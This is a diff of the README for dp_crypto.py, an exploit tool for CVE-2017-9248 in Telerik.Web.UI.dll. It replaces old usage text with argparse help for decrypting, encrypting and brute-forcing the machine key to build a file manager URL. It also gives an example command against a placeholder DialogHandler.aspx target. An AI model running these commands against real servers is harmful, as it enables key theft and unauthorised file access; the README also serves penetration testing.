@@ -20,26 +20,59 @@ This exploit attacks a weak encryption implementation to discover the dialog han
 ## Usage
 
 ```
-$ ./dp_crypto.py 
+$ python3 dp_crypto.py -h
 
 dp_crypto by Paul Taylor / Foregenix Ltd
-
 CVE-2017-9248 - Telerik.Web.UI.dll Cryptographic compromise
 
-Usage:
+usage: dp_crypto.py [-h] {d,e,k,b,p} ...
 
-Decrypt a ciphertext:        -d ciphertext key
-Encrypt a plaintext:         -e plaintext key
-Bruteforce key/generate URL: -k url key_length key_charset accuracy
-Encode parameter to base64:  -b plain_parameter
-Decode base64 parameter:     -p encoded_parameter
+positional arguments:
+  {d,e,k,b,p}
+    d          Decrypt a ciphertext
+    e          Encrypt a plaintext
+    k          Bruteforce key/generate URL
+    b          Encode parameter to base64
+    p          Decode base64 parameter
 
-To test all ascii characters set key_charset to: all, for upper case hex (e.g. machine key) set to hex.
+optional arguments:
+  -h, --help   show this help message and exit
+```
 
-Maximum accuracy is out of 64 where 64 is the most accurate, however 9 will usually suffice.
+To find a key:
 
-The following example should be sufficient to crack machine key and generate a valid file manager URL:
-./dp_crypto -k http://fake.bao7uo.com/Telerik.Web.UI.DialogHandler.aspx 48 hex 9
+```
+$ python3 dp_crypto.py k -h
+
+dp_crypto by Paul Taylor / Foregenix Ltd
+CVE-2017-9248 - Telerik.Web.UI.dll Cryptographic compromise
+
+usage: dp_crypto.py k [-h] [-u URL] [-l KEY_LEN] [-o ORACLE] [-v VERSION]
+                      [-c CHARSET] [-a ACCURACY] [-p PROXY]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     Target URL
+  -l KEY_LEN, --key-len KEY_LEN
+                        Len of the key to retrieve, OPTIONAL: default is 48
+  -o ORACLE, --oracle ORACLE
+                        The oracle text to use. OPTIONAL: default value is for
+                        english version, other languages may have other error
+                        message
+  -v VERSION, --version VERSION
+                        OPTIONAL. Specify the version to use rather than
+                        iterating over all of them
+  -c CHARSET, --charset CHARSET
+                        Charset used by the key, can use all, hex, or user
+                        defined. OPTIONAL: default is hex
+  -a ACCURACY, --accuracy ACCURACY
+                        Maximum accuracy is out of 64 where 64 is the most
+                        accurate, accuracy of 9 will usually suffice for a
+                        hex, but 21 or more might be needed when testing all
+                        ascii characters. Increase the accuracy argument if no
+                        valid version is found. OPTIONAL: default is 9.
+  -p PROXY, --proxy PROXY
+                        Specify OPTIONAL proxy server, e.g. 127.0.0.1:8080
 ```
 
 ## Example
@@ -47,7 +80,7 @@ The following example should be sufficient to crack machine key and generate a v
 ![dp_crypto screenshot](images/key-link2_screenshot.png)
 
 ```
-$ ./dp_crypto.py -k http://fake.bao7uo.com/Telerik.Web.UI.DialogHandler.aspx 48 hex 9
+$ ./dp_crypto.py k -u http://fake.bao7uo.com/Telerik.Web.UI.DialogHandler.aspx
 
 dp_crypto by Paul Taylor / Foregenix Ltd
 CVE-2017-9248 - Telerik.Web.UI.dll Cryptographic compromise
